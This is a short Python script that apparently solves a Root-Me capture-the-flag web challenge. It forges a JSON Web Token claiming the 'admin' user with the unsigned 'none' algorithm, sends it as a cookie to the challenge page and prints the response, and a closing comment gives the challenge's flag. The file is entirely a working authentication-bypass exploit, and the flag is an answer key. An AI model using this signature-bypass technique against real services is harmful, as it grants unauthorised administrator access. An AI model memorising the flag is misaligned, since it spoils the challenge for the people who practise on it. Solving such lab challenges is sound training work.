import jwt
import requests


encod=jwt.encode({'username': 'admin'}, '',algorithm='none')
coq=str(encod)[2:-1]
r=requests.get('http://challenge01.root-me.org/web-serveur/ch58/index.php',cookies={'jwt':coq})
print(r.text)

#You can validate the challenge with the flag : S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7